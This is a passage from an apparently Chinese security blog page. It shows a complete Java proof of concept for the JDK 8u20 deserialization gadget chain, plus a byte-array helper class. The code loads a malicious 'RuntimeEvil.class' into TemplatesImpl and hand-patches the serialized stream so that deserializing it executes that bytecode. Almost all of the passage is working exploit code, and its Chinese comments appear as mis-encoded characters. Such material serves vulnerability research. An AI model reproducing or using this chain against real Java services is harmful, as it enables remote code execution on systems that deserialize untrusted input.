href="https://xz.aliyun.com/t/8277?time__1311=n4+xnD0Dc7ex9DIrxBqroGkDRlW3GCD0guxeTD&u_atoken=21a5f0453c9b225c72d561589e310fe4&u_asig=1a0c380917266645911855714e00d6#toc-5">https://xz.aliyun.com/t/8277?time__1311=n4%2BxnD0Dc7ex9DIrxBqroGkDRlW3GCD0guxeTD&amp;u_atoken=21a5f0453c9b225c72d561589e310fe4&amp;u_asig=1a0c380917266645911855714e00d6#toc-5</a></p><p>payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.beans.beancontext.BeanContextSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK8u20</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\target\\classes\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">Annovar2map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Annovar2map.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesClass);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">typeField</span> <span class="operator">=</span> annotationInvocationHandler.getClass().getDeclaredField(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        typeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">annoProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        <span class="type">LinkedHashSet</span> <span class="variable">annoset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        typeField.set(annotationInvocationHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanContextSupport</span> <span class="variable">bcs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanContextSupport</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.beans.beancontext.BeanContextSupport&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">serializable</span> <span class="operator">=</span> cc.getDeclaredField(<span class="string">&quot;serializable&quot;</span>);</span><br><span class="line">        serializable.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        serializable.set(bcs, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">beanContextChildPeer</span> <span class="operator">=</span> cc.getSuperclass().getDeclaredField(<span class="string">&quot;beanContextChildPeer&quot;</span>);</span><br><span class="line">        beanContextChildPeer.set(bcs, bcs);</span><br><span class="line"></span><br><span class="line">        annoset.add(bcs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baous</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baous);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(annoset);</span><br><span class="line">        oos.writeObject(annotationInvocationHandler);</span><br><span class="line">        oos.writeObject(templatesClass);</span><br><span class="line">        oos.writeObject(annoProxy);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = baous.toByteArray();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Modify HashSet size from  1 to 3&quot;</span>);</span><br><span class="line">        bytes[<span class="number">89</span>] = <span class="number">3</span>; <span class="comment">//ä¿®æ”¹hashsetçš„é•¿åº¦ï¼ˆå…ƒç´ ä¸ªæ•°ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒæ•´ TC_ENDBLOCKDATA æ ‡è®°çš„ä½ç½®</span></span><br><span class="line">        <span class="comment">//0x73 = 115, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">115</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Delete TC_ENDBLOCKDATA at the end of HashSet&quot;</span>);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°† serializable çš„å€¼ä¿®æ”¹ä¸º 1</span></span><br><span class="line">        <span class="comment">//0x73 = 115, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">1</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">115</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Modify BeanContextSupport.serializable from 0 to 1&quot;</span>);</span><br><span class="line">                bytes[i+<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         TC_BLOCKDATA - 0x77</span></span><br><span class="line"><span class="comment">         Length - 4 - 0x04</span></span><br><span class="line"><span class="comment">         Contents - 0x00000000</span></span><br><span class="line"><span class="comment">         TC_ENDBLOCKDATA - 0x78</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æŠŠè¿™éƒ¨åˆ†å†…å®¹å…ˆåˆ é™¤ï¼Œå†é™„åŠ åˆ° AnnotationInvocationHandler ä¹‹å</span></span><br><span class="line">        <span class="comment">//ç›®çš„æ˜¯è®© AnnotationInvocationHandler å˜æˆ BeanContextSupport çš„æ•°æ®æµ</span></span><br><span class="line">        <span class="comment">//0x77 = 119, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">119</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">4</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">120</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport&quot;</span>);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">              serialVersionUID - 0x00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="comment">                  newHandle 0x00 7e 00 28</span></span><br><span class="line"><span class="comment">                  classDescFlags - 0x00 -</span></span><br><span class="line"><span class="comment">                  fieldCount - 0 - 0x00 00</span></span><br><span class="line"><span class="comment">                  classAnnotations</span></span><br><span class="line"><span class="comment">                    TC_ENDBLOCKDATA - 0x78</span></span><br><span class="line"><span class="comment">                  superClassDesc</span></span><br><span class="line"><span class="comment">                    TC_NULL - 0x70</span></span><br><span class="line"><span class="comment">              newHandle 0x00 7e 00 29</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//0x78 = 120, 0x70 = 112</span></span><br><span class="line">        <span class="comment">//0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i + <span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">8</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">9</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">10</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">11</span>] == <span class="number">120</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">12</span>] == <span class="number">112</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler&quot;</span>);</span><br><span class="line">                i = i + <span class="number">13</span>;</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="type">byte</span>) <span class="number">0x77</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="type">byte</span>) <span class="number">0x04</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="type">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="type">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="type">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="type">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="type">byte</span>) <span class="number">0x78</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°† sun.reflect.annotation.AnnotationInvocationHandler çš„ classDescFlags ç”± SC_SERIALIZABLE ä¿®æ”¹ä¸º SC_SERIALIZABLE | SC_WRITE_METHOD</span></span><br><span class="line">        <span class="comment">//è¿™ä¸€æ­¥å…¶å®ä¸æ˜¯é€šè¿‡ç†è®ºæ¨ç®—å‡ºæ¥çš„ï¼Œæ˜¯é€šè¿‡debug ä»¥åŠæŸ¥çœ‹ pwntesterçš„ poc å‘ç°éœ€è¦è¿™ä¹ˆæ”¹</span></span><br><span class="line">        <span class="comment">//åŸå› æ˜¯å¦‚æœä¸è®¾ç½® SC_WRITE_METHOD æ ‡å¿—çš„è¯ defaultDataEnd = trueï¼Œå¯¼è‡´ BeanContextSupport -&gt; deserialize(ois, bcmListeners = new ArrayList(1))</span></span><br><span class="line">        <span class="comment">// -&gt; count = ois.readInt(); æŠ¥é”™ï¼Œæ— æ³•å®Œæˆæ•´ä¸ªååºåˆ—åŒ–æµç¨‹</span></span><br><span class="line">        <span class="comment">// æ²¡æœ‰ SC_WRITE_METHOD æ ‡è®°ï¼Œè®¤ä¸ºè¿™ä¸ªååºåˆ—æµåˆ°æ­¤å°±ç»“æŸäº†</span></span><br><span class="line">        <span class="comment">// æ ‡è®°ï¼š 7375 6e2e 7265 666c 6563 --&gt; sun.reflect...</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">115</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">117</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">110</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">46</span> &amp;&amp;</span><br><span class="line">                    bytes[i + <span class="number">4</span>] == <span class="number">114</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">101</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">102</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">108</span> )&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -&gt; classDescFlags from SC_SERIALIZABLE to &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;SC_SERIALIZABLE | SC_WRITE_METHOD&quot;</span>);</span><br><span class="line">                i = i + <span class="number">58</span>;</span><br><span class="line">                bytes[i] = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åŠ å›ä¹‹å‰åˆ é™¤çš„ TC_BLOCKDATAï¼Œè¡¨æ˜ HashSet åˆ°æ­¤ç»“æŸ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Add TC_BLOCKDATA at end&quot;</span>);</span><br><span class="line">        bytes = Util.addAtLast(bytes, (<span class="type">byte</span>) <span class="number">0x78</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fous</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;jre8u20.ser&quot;</span>);</span><br><span class="line">        fous.write(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;jre8u20.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº“Utilï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Util</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä» byte æ•°ç»„ä¸­åˆ é™¤æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array è¦æ“ä½œçš„ byte æ•°ç»„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> index è¦åˆ é™¤çš„å…ƒç´ ç´¢å¼•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> åˆ é™¤å…ƒç´ åçš„ byte æ•°ç»„</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] deleteAt(<span class="type">byte</span>[] array, <span class="type">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= array.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(<span class="string">&quot;Index out of bounds: &quot;</span> + index);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[array.length - <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(array, <span class="number">0</span>, result, <span class="number">0</span>, index);</span><br><span class="line">        System.arraycopy(array, index + <span class="number">1</span>, result, index, array.length - index - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åœ¨ byte æ•°ç»„æœ«å°¾æ·»åŠ ä¸€ä¸ªå…ƒç´ ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array è¦æ“ä½œçš„ byte æ•°ç»„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value è¦æ·»åŠ çš„å…ƒç´ å€¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ·»åŠ å…ƒç´ åçš„ byte æ•°ç»„</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] addAtLast(<span class="type">byte</span>[] array, <span class="type">byte</span> value) &#123;</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[array.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(array, <span class="number">0</span>, result, <span class="number">0</span>, array.length);</span><br><span class="line">        result[array.length] = value;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] addAtIndex(<span class="type">byte</span>[] bytes, <span class="type">int</span> index, <span class="type">byte</span> value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; bytes.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(<span class="string">&quot;Index out of bounds&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œæ¯”åŸæ•°ç»„å¤§1ä¸ªå…ƒç´ </span></span><br><span class="line">        <span class="type">byte</span>[] newBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¤åˆ¶å‰åŠéƒ¨åˆ†æ•°æ®</span></span><br><span class="line">        System.arraycopy(bytes, <span class="number">0</span>, newBytes, <span class="number">0</span>, index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ’å…¥æ–°å…ƒç´ </span></span><br><span class="line">        newBytes[index] = value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¤åˆ¶ååŠéƒ¨åˆ†æ•°æ®</span></span><br><span class="line">        System.arraycopy(bytes, index, newBytes, index + <span class="number">1</span>, bytes.length - index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> newBytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918220159414.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918220159414.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 